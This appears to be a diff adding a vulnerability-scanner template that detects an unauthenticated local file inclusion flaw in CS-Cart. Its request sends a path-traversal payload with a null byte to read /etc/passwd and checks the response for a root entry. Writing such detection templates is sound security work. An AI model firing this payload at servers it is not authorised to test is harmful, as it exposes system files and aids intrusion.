@@ -1,0 +1,22 @@
+id: cs-cart-unauthenticated-lfi
+name: CS-Cart - Local File Inclusion
+severity: high
+confidence: tentative
+description: CS-Cart is vulnerable to local file inclusion because it allows remote unauthenticated attackers to access locally
+  stored files and reveal their content.
+reference: CWE-22
+tags:
+- cscart
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
+  matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  - type: status
+    status:
+    - 200
+  condition: and
